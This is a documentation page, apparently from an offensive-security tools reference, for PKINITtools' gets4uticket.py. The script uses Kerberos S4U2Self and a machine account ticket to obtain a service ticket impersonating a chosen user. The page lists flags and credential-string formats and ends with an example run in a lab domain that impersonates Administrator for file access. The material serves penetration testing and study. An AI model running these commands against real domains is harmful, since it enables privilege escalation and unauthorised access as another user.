---
title : "gets4uticket.py"
# pre : ' '
description : "Gets an S4U2self ticket impersonating given user."
date : 2023-12-03T06:11:51+01:00
# hidden : true
# draft : true
weight : 20
# tags : ['']
---

---

Gets an S4U2self ticket impersonating given user.

Uses Kerberos S4U2Self to request a service ticket that is valid on the host for which you've obtained a certificate. This ticket can then be used to interact with the original host. This only requires a TGT for the machine account of this host. This TGT should be in a ccache file that you specify in the `kerberos_connection_url`. The only accepted `kerberos_connection_url` for this example is one containing a ccache file, so for example `kerberos+ccache://domain.local\\victimhostname\$:victimhostname.ccache@kdchostname.domain.local`. The SPN should be a service name on the host you are impersonating, you can't use this for delegation attacks (since it does not implement S4U2Proxy, there are plenty of tools already for that).

## Installation

Install [PKINITtools]({{< ref "pkinittools" >}}).

## Usage

```plain
gets4uticket.py [-h] [-v] kerberos_connection_url spn targetuser ccache
```

## Flags

```plain
positional arguments:
  kerberos_connection_url
                        the kerberos target string in the following format kerberos+ccache://domain\user:file.ccache@<domaincontroller-ip>
  spn                   the service principal in format <service>/<server-hostname>@<domain> Example: cifs/fileserver.test.corp@TEST.corp for a TGS ticket to be used for file access on server "fileserver". IMPORTANT:
                        SERVER'S HOSTNAME MUST BE USED, NOT IP!!!
  targetuser
  ccache                ccache file to store the TGT ticket in

options:
  -h, --help            show this help message and exit
  -v, --verbose

==== Extra Help ====
   kerberos connection url secret types: 
   - Plaintext: "pw" or "pass" or "password"
   - NT hash: "nt"
   - RC4 key: "rc4"
   - AES128/256 key: "aes"
   - CCACHE file: "ccache"
   - SSPI: "sspi"
   
   Example:
   - Plaintext + SOCKS5 proxy:
      kerberos+password://domain\user:SecretPassword@127.0.0.1/proxytype=socks5&proxyhost=127.0.0.1&proxyport=1080
   - Plaintext:
      kerberos+password://domain\user:SecretPassword@127.0.0.1
      kerberos+pw://domain\user:SecretPassword@127.0.0.1
      kerberos+pass://domain\user:SecretPassword@127.0.0.1
   - NT hash:
      kerberos+nt://domain\user:921a7fece11f4d8c72432e41e40d0372@127.0.0.1
   - SSPI:
      TEST/user/sspi:@192.168.1.1
   - RC4 key:
      kerberos+rc4://domain\user:921a7fece11f4d8c72432e41e40d0372@127.0.0.1
   - AES key:
      kerberos+aes://domain\user:921a7fece11f4d8c72432e41e40d0372@127.0.0.1
   - CCACHE file:
      kerberos+ccache://domain\user:creds.ccache@127.0.0.1
   - KEYTAB file:
      kerberos+keytab://domain\user:creds.keytab@127.0.0.1
   - PFX file:
      kerberos+pfx://TEST.corp\Administrator:admin@10.10.10.2/?certdata=test.pfx
   - PFX string (b64):
      kerberos+pfxstr://TEST.corp\Administrator:admin@10.10.10.2/?certdata=BASE64DATA
   - No auth (preauth not req):
      kerberos+none://TEST.corp\asrepuser@10.10.10.2/
```

## Examples

```plain
(PKINITtools) user@localhost:~/PKINITtools$ python gets4uticket.py kerberos+ccache://testsegment.local\\s2019dc\$:s2019dc.ccache@s2016dc.testsegment.local cifs/s2019dc.testsegment.local@testsegment.local Administrator@testsegment.local out.ccache -v
2021-07-28 10:09:13,687 minikerberos INFO     Trying to get SPN with Administrator@testsegment.local for cifs/s2019dc.testsegment.local@testsegment.local
2021-07-28 10:09:13,695 minikerberos INFO     Success!
2021-07-28 10:09:13,696 minikerberos INFO     Done!
```
